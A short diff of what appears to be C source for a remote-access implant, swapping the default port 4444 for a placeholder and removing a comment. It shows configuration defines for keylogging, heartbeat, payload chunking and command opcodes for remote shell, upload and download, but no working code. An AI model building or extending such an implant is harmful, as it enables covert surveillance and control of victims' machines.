@@ -56,7 +56,7 @@
 
 
 #define DEFAULT_HOST "Your instance ip"
-#define DEFAULT_PORT 4444
+#define DEFAULT_PORT "your instace port"
 #define MAX_PAYLOAD (10 * 1024 * 1024)
 #define CHUNK_SIZE 1024
 #define MAX_RETRIES 5
@@ -64,7 +64,7 @@
 #define KEYLOG_SLEEP_MS 25
 #define HEARTBEAT_INTERVAL 30
 
-// Command opcodes
+
 #define CMD_SHELL       0x01
 #define CMD_UPLOAD      0x02
 #define CMD_DOWNLOAD    0x03
